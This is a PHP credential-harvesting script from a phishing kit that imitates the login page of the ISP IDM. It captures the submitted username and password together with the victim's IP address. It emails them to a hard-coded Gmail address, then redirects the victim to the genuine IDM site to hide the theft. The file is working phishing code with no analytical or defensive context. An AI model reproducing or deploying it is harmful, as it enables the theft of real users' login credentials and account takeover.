<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------IDM Mail Spam ReZulT-----------------------\n";
$message .= "Username : ".$_POST['ctl00_MPH_txtUserName']."\n";
$message .= "password: ".$_POST['ctl00_MPH_txtPassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Emp0w3r3d By Mr.Abuja First Son-----------------------------\n";

$recipient = "sjerry1958@gmail.com";
$subject = "IDM- $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.idm.net.lb/news/press.asp");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>